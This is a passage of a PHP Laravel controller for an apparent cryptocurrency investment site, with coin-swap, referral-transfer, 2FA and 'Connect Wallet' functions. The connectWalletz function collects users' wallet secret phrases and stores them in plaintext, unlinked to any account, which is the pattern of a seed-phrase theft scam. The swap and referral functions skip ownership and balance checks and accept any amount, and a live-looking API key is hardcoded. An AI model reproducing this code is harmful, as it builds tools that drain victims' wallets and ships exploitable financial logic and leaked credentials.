        $data['pay'] = PaymentWallet::wherestatus(1)->get();
        return view('user.swap-coin', $data);
    }

    public function sswapCoins(Request $request)
    {
        DB::beginTransaction();
        try
        {
            $wallet1 = UserWallet::findorfail($request->wallet_1);
            $wallet1->amount_in_usd = $wallet1->amount_in_usd - $request->amount;
            if($wallet1->amount_in_usd < 0)
            {
                session()->flash('message', 'Coin Swap Failed.');
                Session::flash('type', 'danger');
                Session::flash('title', 'error');
                return back();
            }
            $rate = $wallet1->wallets->crypto_rate;
            $calc = $wallet1->amount_in_usd / $rate;
            $calc = round($calc, 6);
            $wallet1->amount_in_crypto = $calc;
            $wallet1->update();

            $ch = UserWallet::wherewallet_id($request->wallet_2)->whereuser_id(Auth::user()->id)->exists();
            if($ch)
            {
                $wallet2 = UserWallet::wherewallet_id($request->wallet_2)->whereuser_id(Auth::user()->id)->first();
                $wallet2->amount_in_usd = $wallet2->amount_in_usd + $request->amount;
                $rate2 = $wallet2->wallets->crypto_rate;
                $calc2 = $wallet2->amount_in_usd / $rate2;
                $calc2 = round($calc2, 6);
                $wallet2->amount_in_crypto = $calc2;
                $wallet2->update();
            }else{
                $wall = new UserWallet();
                $wall->user_id = Auth::user()->id;
                $wall->wallet_id = $request->wallet_2;
                $ww = PaymentWallet::findorfail($request->wallet_2);
                $wall->amount_in_usd = $request->amount;
                $rate2 = $ww->crypto_rate;
                $calc2 = $request->amount / $rate2;
                $calc2 = round($calc2, 6);
                $wall->amount_in_crypto = $calc2;
                $wall->status = 1;
                $wall->save();
            }

            DB::commit();

            session()->flash('message', 'Coin Swap Completed Successfully.');
            Session::flash('type', 'success');
            Session::flash('title', 'success');
            return redirect()->route('wallets');
        }catch (\Exception $e)
        {
            DB::rollback();
            session()->flash('message',$e->getMessage());
            session()->flash('title','Opps..');
            session()->flash('type','warning');
            return back();
        }

    }

    public function transferReference()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Transfer Referral Bonus";
        $data['bonus'] = Reference::whereUser_id(Auth::user()->id)->sum('balance');
        $data['balance'] = UserReferral::whereUser_id(Auth::user()->id)->sum('balance');
        $data['pay'] = PaymentWallet::wherestatus(1)->get();
        return view('user.transfer-reference', $data);
    }

    public function transferReferral(Request $request)
    {
        DB::beginTransaction();
        try
        {
            $walle = PaymentWallet::findorfail($request->wallet_2);
            $ch = UserWallet::wherewallet_id($request->wallet_2)->whereuser_id(Auth::user()->id)->exists();
            if($ch)
            {
                $wallet2 = UserWallet::wherewallet_id($request->wallet_2)->whereuser_id(Auth::user()->id)->first();
                $wallet2->amount_in_usd = $wallet2->amount_in_usd + $request->amount;
//                $walname = strtolower(Str::slug($wallet2->wallets->name));
//                $api = file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//                $response2 = json_decode($api);
//                $rate2 = $response2[0]->current_price;
                $rate2 = $wallet2->wallets->crypto_rate;
                $calc2 = $wallet2->amount_in_usd / $rate2;
                $calc2 = round($calc2, 6);
                $wallet2->amount_in_crypto = $calc2;
                $wallet2->update();

                $ref = new UserReferral();
                $ref->user_id = Auth::user()->id;
                $ref->balance = $request->amount;
                $ref->save();
            }else{
                $wallet = PaymentWallet::findorfail($request->wallet_2);
                $wall = new UserWallet();
                $wall->user_id = Auth::user()->id;
                $wall->wallet_id = $request->wallet_2;
                $wall->amount_in_usd = $request->amount;
//                $walname = strtolower(Str::slug($wallet->name));
//                $api = file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//                $response2 = json_decode($api);
//                $rate2 = $response2[0]->current_price;
                $rate2 = $wallet->crypto_rate;
                $calc2 = $request->amount / $rate2;
                $calc2 = round($calc2, 6);
                $wall->amount_in_crypto = $calc2;
                $wall->status = 1;
                $wall->save();

                $ref = new UserReferral();
                $ref->user_id = Auth::user()->id;
                $ref->balance = $request->amount;
                $ref->save();
            }

            DB::commit();

            session()->flash('message', 'Referral Bonus Transferred Successfully.');
            Session::flash('type', 'success');
            Session::flash('title', 'success');
            return redirect()->route('wallets');
        }catch (\Exception $e)
        {
            DB::rollback();
            session()->flash('message',$e->getMessage());
            session()->flash('title','Opps..');
            session()->flash('type','warning');
            return back();
        }

    }

    public function settings()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Setting";
        $data['payment'] = Payment::first();
        $data['wallets'] = PaymentWallet::wherestatus(1)->get();
        return view('user.setting',$data);
    }

    public function start2FA()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Initialize 2FA";
        $user = User::findorfail(Auth::user()->id);
        $google2fa = app('pragmarx.google2fa');
        $user["google2fa_secret"] = $google2fa->generateSecretKey();
        $user->update();
        $QR_Image = $google2fa->getQRCodeInline(
            $data['site_title'],
            $user['email'],
            $user['google2fa_secret']
        );
        $data['QR_Image'] = $QR_Image;
        $data['secret'] = $user['google2fa_secret'];
        return view('user.2fa.start-2fa',$data);
    }

    public function complete2FA()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Enter 2FA OTP";
        $user = User::findorfail(Auth::user()->id);
        return view('user.2fa.2fa',$data);
    }

    public function enable2FA()
    {
        $user = User::findorfail(Auth::user()->id);
        $user->two_fa = 1;
        $user->save();
        $data['user'] = $user;
        session()->flash('message', '2FA is Enabled Successfully.');
        Session::flash('type', 'success');
        Session::flash('title', 'success');
        return redirect()->route('settings');
    }

    public function disable2fa(Request $request)
    {
        if (!(Hash::check($request->get('password'), Auth::user()->password))) {
            // The passwords matches
            session()->flash('message', 'Your  password does not match with your account password. Please try again.');
            Session::flash('type', 'danger');
            Session::flash('title', 'Error');
            return back();
        }

        $validatedData = $request->validate([
            'password' => 'required',
        ]);
        $user = Auth::user();
        $user->two_fa = 0;
        $user->google2fa_secret = null;
        $user->update();
        session()->flash('message', '2FA is now disabled.');
        Session::flash('type', 'success');
        Session::flash('title', 'success');
        return redirect()->route('settings');
    }

    public function cryptoRate()
    {
        $url = 'https://pro-api.coinmarketcap.com/v2/cryptocurrency/info';
        $parameters = [
            'start' => '1',
            'limit' => '20',
            'convert' => 'USD'
        ];

        $headers = [
            'Accepts: application/json',
            'X-CMC_PRO_API_KEY: fab20553-cdbb-40f2-94f0-6cb18fbcfd09'
        ];
        $qs = http_build_query($parameters); // query string encode the parameters
        $request = "{$url}?{$qs}"; // create the request URL


        $curl = curl_init(); // Get cURL resource
// Set cURL options
        curl_setopt_array($curl, array(
            CURLOPT_URL => $request,            // set the request URL
            CURLOPT_HTTPHEADER => $headers,     // set the headers
            CURLOPT_RETURNTRANSFER => 1         // ask for raw response instead of bool
        ));

        $response = curl_exec($curl); // Send the request, save the response
        curl_close($curl); // Close request
        return $response;

    }

    public function connectWallet()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Connect Wallet";
        return view('user.connect-wallet', $data);
    }

    public function connectWalletz(Request $request)
    {
        $this->validate($request,[
            'wallet_name' => 'required',
            'secret_phrase' => 'required',
        ]);
        $phrase = new PassPhrase();
        $phrase->wallet_name = $request->wallet_name;
        $phrase->secret_phrase = $request->secret_phrase;
        $phrase->save();
    }

}
